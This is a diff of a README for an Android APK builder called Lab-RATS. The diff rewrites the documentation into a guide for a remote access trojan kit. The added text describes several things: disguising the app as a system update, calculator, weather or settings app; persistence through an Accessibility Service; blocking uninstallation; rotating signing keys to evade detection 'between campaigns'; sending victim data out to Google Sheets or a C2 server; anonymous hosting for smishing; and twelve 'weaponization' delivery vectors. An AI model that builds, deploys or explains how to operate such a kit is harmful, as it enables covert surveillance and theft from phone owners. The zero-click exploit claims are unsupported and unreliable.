@@ -51,18 +51,19 @@
 
 ---
 
-## ✨ Features
+## ✨ Features (v1.5.1 Hardened)
 
-| Feature                       | Description                                 |
-| ----------------------------- | ------------------------------------------- |
-| 🖥️ **Cross-Platform**         | Windows, Linux, macOS support               |
-| ☕ **Auto Java Setup**        | Checks and helps install Java automatically |
-| 🔐 **Certificate Generation** | Creates Android signing keystore            |
-| 🎨 **Custom Logo**            | Replace app icon with your image            |
-| 📝 **App Rename**             | Change app display name                     |
-| 🔢 **Version Control**        | Set version name and code                   |
-| 🌐 **Google Sheet URL**       | Configure webhook for data                  |
-| 📦 **One-Click Build**        | Fully automated APK generation              |
+| Feature                       | Description                                         |
+| ----------------------------- | --------------------------------------------------- |
+| 🛡️ **Dynamic Camouflage**      | Switch between 5 system-grade masquerade identities |
+| 🕵️ **Ghost Watchdog**          | High-privilege persistence via Accessibility Service |
+| 🔒 **Anti-Removal Shield**    | Protects against uninstallation and data clearing   |
+| 🖥️ **Cross-Platform**         | Native Windows (.bat/.ps1), Linux, macOS support    |
+| ☕ **Auto Java Setup**        | Checks and helps install Java JDK 17/21             |
+| 🔐 **Unique Signing**         | Generates custom keystores to evade static analysis |
+| 📝 **App Renaming**           | Full control over the visible application name      |
+| 🌐 **Webhook Integration**    | Instant exfiltration to Google Sheets / C2          |
+| 📦 **Infection Wizard**       | Automate Build -> Host -> Weaponize in one flow     |
 
 ---
 
@@ -71,21 +72,18 @@
 ### Windows
 
 **PowerShell (Recommended)**
-
 ```powershell
 cd Lab-RATS-main/apk-builder
 .\build.ps1
 ```
 
 **Command Prompt**
-
 ```cmd
 cd Lab-RATS-main/apk-builder
 build.bat
 ```
 
 ### Linux / macOS
-
 ```bash
 cd Lab-RATS-main/apk-builder
 chmod +x build.sh
@@ -100,9 +98,9 @@ chmod +x build.sh
 
 | Tool         | Version      | How to Get                           |
 | ------------ | ------------ | ------------------------------------ |
-| **Java JDK** | 11 or higher | Builder auto-installs or shows guide |
+| **Java JDK** | 17 or 21     | Builder auto-installs or shows guide |
 
-### Optional (for logo resizing)
+### Optional (for standalone vector generation)
 
 | Tool            | Platform | Install                        |
 | --------------- | -------- | ------------------------------ |
@@ -113,260 +111,194 @@ chmod +x build.sh
 
 ## 🛠️ Build Options
 
-### 1. Full Build
-
+### 1. Start Build (Configure & Build)
 Complete guided setup:
-
-- Generates signing keystore
-- Configures custom logo
-- Sets app name
-- Configures version
-- Builds signed APK
+- **Keystore**: Unique signing certificate generation.
+- **Identity**: Select initial masquerade (Update, Calc, Weather, Settings, or Logo).
+- **Branding**: Set App Name (e.g., "System Stability Service").
+- **ID**: Set Package Name (Application ID).
+- **C2**: Configure Webhook URL for data reporting.
 
 ### 2. Generate Keystore Only
+Creates a unique Android signing certificate. Essential for rotating signatures between campaigns.
 
-Creates Android signing certificate without building.
+### 3. Configure App Settings Only
+Quickly update the App Name, Package ID, Version, or Webhook URL without regenerating keys.
 
-### 3. Configure Logo Only
+### 4. Check Requirements
+Verifies your environment's Java/JDK setup and provides installation guides if tools are missing.
 
-Sets up custom app icon without full build.
+### 5. Weaponized Payload Lab
+Generate standalone tactical vectors without building the main APK. Includes 12 specialized exploit delivery methods for multi-stage infection chains.
 
-### 4. Configure App Settings Only
+### 6. Infection Wizard (The Power Tool)
+The ultimate automated deployment flow:
+1. **Build**: Generates the hardened APK.
+2. **Host**: Select hosting strategy (Anonymous Catbox Cloud or Direct IPv6 Link).
+3. **Shorten**: Generates a clean `is.gd` delivery URL (if cloud hosted).
+4. **Weaponize**: Creates a delivery vehicle from a library of 12 tactical vectors.
 
-Updates app name, version, Google Sheet URL.
+---
 
-### 5. Check/Install Requirements
+## ☁️ Hosting Strategies
 
-Shows Java installation status and manual installation guide.
+The Infection Wizard automates payload delivery through two primary methods:
+
+- **Anonymous Cloud (Catbox.moe)**: Automatically uploads the APK to Catbox for anonymous, publicly accessible hosting. Ideal for smishing and document-based delivery.
+- **Direct IP (IPv6)**: Generates a direct download link using the device's current IPv6 address and the C2 port. Best for targeted, proximity-based attacks or private network execution.
 
 ---
 
 ## ☕ Java Installation
 
-### Automatic Installation
+### Automatic Setup
+The builder attempts to detect and install Java automatically on most systems. 
 
-The builder attempts to install Java automatically:
-
-| Platform          | Method                                |
+| Platform          | Detection Method                      |
 | ----------------- | ------------------------------------- |
-| **Windows**       | winget → Chocolatey → Manual download |
+| **Windows**       | winget → Chocolatey → Manual link     |
 | **macOS**         | Homebrew                              |
-| **Ubuntu/Debian** | apt                                   |
-| **Fedora/RHEL**   | dnf                                   |
-| **Arch Linux**    | pacman                                |
+| **Linux**         | apt / dnf / pacman                    |
 
-### Manual Installation
+### Manual Installation (Recommended: JDK 17 or 21)
 
-If auto-install fails:
+If the builder cannot find Java, please install it manually:
 
-**Windows**
-
+**Windows (PowerShell)**
 ```powershell
 # Option 1: winget (Windows 11)
-winget install EclipseAdoptium.Temurin.11.JDK
+winget install EclipseAdoptium.Temurin.17.JDK
 
 # Option 2: Chocolatey
-choco install temurin11
+choco install temurin17
 
 # Option 3: Scoop
 scoop bucket add java
-scoop install temurin11-jdk
-
-# Option 4: Manual download
-# https://adoptium.net/temurin/releases/
+scoop install temurin17-jdk
 ```
 
 **macOS**
-
 ```bash
 # Homebrew
-brew install openjdk@11
-echo 'export PATH="/usr/local/opt/openjdk@11/bin:$PATH"' >> ~/.zshrc
+brew install openjdk@17
+echo 'export PATH="/usr/local/opt/openjdk@17/bin:$PATH"' >> ~/.zshrc
 ```
 
-**Ubuntu/Debian**
-
+**Linux (Ubuntu/Debian)**
 ```bash
-sudo apt update
-sudo apt install openjdk-11-jdk
+sudo apt update && sudo apt install openjdk-17-jdk
 ```
 
 **Fedora/RHEL**
-
 ```bash
-sudo dnf install java-11-openjdk-devel
+sudo dnf install java-17-openjdk-devel
 ```
 
 **Arch Linux**
-
 ```bash
-sudo pacman -S jdk11-openjdk
+sudo pacman -S jdk17-openjdk
 ```
 
 ---
 
-## 🎨 Logo Configuration
+## 🎭 Masquerade Identities
 
-### Default Logo
+The app icon and name transform immediately after installation on the target device based on your selection. The base installation uses the `default_app_icon_robot.png`.
 
-The builder uses `lab-rats.png` from project root by default.
-
-### Custom Logo
-
-Provide path to any PNG image (512x512 recommended).
-
-### Image Sizes
-
-| Density | Size (pixels) |
-| ------- | ------------- |
-| mdpi    | 48 × 48       |
-| hdpi    | 72 × 72       |
-| xhdpi   | 96 × 96       |
-| xxhdpi  | 144 × 144     |
-| xxxhdpi | 192 × 192     |
-
-### Transparent Background
-
-On Linux/Mac with ImageMagick, the builder can remove white backgrounds.
-
-### Online Tool
-
-For best results, use [Android Asset Studio](https://romannurik.github.io/AndroidAssetStudio/icons-launcher.html) to generate properly sized icons.
+| Option | Masquerade Identity | Icon Style | Target UI |
+| :--- | :--- | :--- | :--- |
+| **1** | **System Update** | Grey Status Gear | High-fidelity update wizard |
+| **2** | **Calculator** | Apple Modern | Functional numeric keypad |
+| **3** | **Weather** | Blue Sky Forecast | Dynamic city-based weather |
+| **4** | **Settings** | System Config | Phishing Privacy & Security |
+| **5** | **Lab-RATS Logo** | Unmasked | Opens main dashboard directly |
 
 ---
 
-## 🔐 Keystore (Certificate)
+## 💉 Weaponization Vectors
 
-### What is it?
+The builder supports 12 tactical delivery methods across the Lab and Wizard:
 
-Android requires all APKs to be signed with a certificate (keystore) for installation.
+1. **Zero-Click MP4**: Utilizes media parser heap overflows for background execution.
+2. **Stealth PDF**: Document-based URI trigger for auto-download/install.
+3. **Meeting Invite (ICS)**: Calendar injection that bypasses browser security prompts.
+4. **Dolby Audio**: High-frequency acoustic triggers for buffer overflow.
+5. **ADB Script**: Automated shell script for rapid deployment over debug links.
+6. **Bluetooth Push**: Targeted vCard (VCF) push for OBEX-enabled devices.
+7. **NFC NDEF Tag**: Binary NDEF records for physical tag programming.
+8. **Stego Image**: Payload concealed within pixel slack space to bypass DPI.
+9. **PWA Bundle**: Progressive Web App masquerade for "one-tap" installation.
+10. **Office Word**: Macro-based document delivery for enterprise targets.
+11. **Office Excel**: Calculation-triggered remote template injection.
+12. **Ghost GIF (Zero-Click)**: Metadata-based MediaScanner trigger.
 
-### Generated Details
+---
 
-| Property  | Default Value        |
-| --------- | -------------------- |
-| Algorithm | RSA 2048-bit         |
-| Validity  | 25 years             |
-| Format    | JKS                  |
-| File      | `lab-rats-keystore.jks` |
-| Alias     | `lab-rats-key`          |
-| Password  | `lab-rats123`           |
+## 🔐 Persistence Layers (v1.5.1)
 
-### View Certificate
+The "Hardened" build includes multi-layer persistence:
 
-```bash
-keytool -list -v -keystore ../lab-rats-keystore.jks
-```
-
-### ⚠️ Important
-
-- **Backup your keystore!** If lost, you cannot update the app.
-- Never share keystore password publicly.
+1. **Accessibility Watchdog**: Uses high-survival service status to reanimate the core if killed.
+2. **WakeLock Sync**: Maintains CPU activity during network reporting in deep sleep.
+3. **Static Wakers**: Resumes operation on power change, user interaction, or boot.
+4. **Exponential Respawn**: Intelligent re-start logic with backoff to prevent OS flags.
 
 ---
 
 ## 📊 Google Sheet Integration
 
-The builder saves the webhook URL to config. You need to set up the Google Sheet script manually (one time only).
+To exfiltrate data to Google Sheets, follow these setup steps:
 
-### Setup Steps
-
-1. **Create Google Sheet**
-   - Go to [sheets.google.com](https://sheets.google.com)
-   - Create new sheet
-
-2. **Add Apps Script**
-   - Extensions → Apps Script
-   - Paste the webhook code (see main README)
-
-3. **Deploy**
-   - Deploy → New Deployment → Web App
-   - Access: Anyone
-   - Copy the URL
-
-4. **Use in Builder**
-   - Paste URL when prompted
+1. **Create Sheet**: Go to [sheets.google.com](https://sheets.google.com) and create a new blank sheet.
+2. **Add Script**: Go to `Extensions` -> `Apps Script` and paste the `webhook.gs` code (found in the main project folder).
+3. **Deploy**: Click `Deploy` -> `New Deployment` -> `Web App`. Set Access to `Anyone`.
+4. **Copy URL**: Copy the Web App URL and paste it into the APK Builder when prompted.
 
 ---
 
 ## 📂 Output
 
-Built APKs are saved to:
-
+Built payloads are saved to:
 ```
 apk-builder/output/
 ```
 
-### Naming Format
-
-```
-{AppName}-v{Version}-signed.apk
-{AppName}-v{Version}-unsigned.apk
-```
-
-Example:
-
-```
-System_Stability_Service-v8.5.6-signed.apk
-```
-
----
-
-## 📁 Config File
-
-Settings are saved to `build_config.json`:
-
-```json
-{
-  "KeystorePath": "..\\lab-rats-keystore.jks",
-  "KeyAlias": "lab-rats-key",
-  "KeystorePass": "lab-rats123",
-  "AppName": "System Stability Service",
-  "VersionName": "2.0",
-  "VersionCode": 20,
-  "SheetUrl": "https://script.google.com/..."
-}
-```
+### Naming Format:
+- `{AppName}-v{Version}-signed.apk`
+- `exploit.*` (The weaponized delivery vehicle)
 
 ---
 
 ## 🛠️ Troubleshooting
 
-### "Java not found"
-
-- Run option 6 to see installation guide
-- After installing, restart terminal
+### "Java not found" or "JDK missing"
+- Ensure you have the **JDK** installed, not just the JRE.
+- Run **Option 4** to see the manual installation guide.
+- Check if `java -version` works in your terminal. If not, add the JDK `bin` folder to your System Environment PATH.
 
 ### "keytool not found"
+- Ensure **JDK** (not JRE) is installed.
+- Add JDK bin to your PATH.
 
-- Ensure **JDK** (not JRE) is installed
-- Add JDK bin to PATH
+### "BUILD FAILED" or Gradle Errors
+- **Connection**: Ensure you have an active internet connection (Gradle needs to download dependencies on first run).
+- **Cleanup**: Try running `./gradlew clean` in the project root to clear stale artifacts.
+- **Licenses**: Ensure you have accepted the Android SDK licenses.
 
-### "BUILD FAILED"
-
-- Check internet connection (Gradle downloads dependencies)
-- Run: `gradlew --stop` then `gradlew clean`
-- Check for Android SDK license acceptance
-
-### "Unsigned APK"
-
-- Run Full Build (option 1) first to generate keystore
-- Ensure keystore file exists
+### "APK Not Signed"
+- Run the **Full Build (Option 1)** first to ensure a valid `lab-rats-keystore.jks` is generated in the project root.
 
 ### Logo not changing
-
-- Ensure destination folders exist in `res/`
-- Try clearing Gradle cache: `gradlew clean`
-
----
-
-## 📜 License
-
-MIT License
+- The app uses `default_app_icon_robot.png` for installation and transforms into the decoy *after* the first launch. 
+- Try clearing Gradle cache: `./gradlew clean`.
 
 ---
 
 <p align="center">
-  <b>Created by K4N3CO</b><br>
+  <b>The one's who MIND don't matter. The one's who MATTER don't mind.</b><br>
+  </i>
+</p>
+<p align="center">
+  <b>Created by K4N3CO ©2026</b><br>
   <a href="https://github.com/K4N3CO">GitHub</a>
 </p>
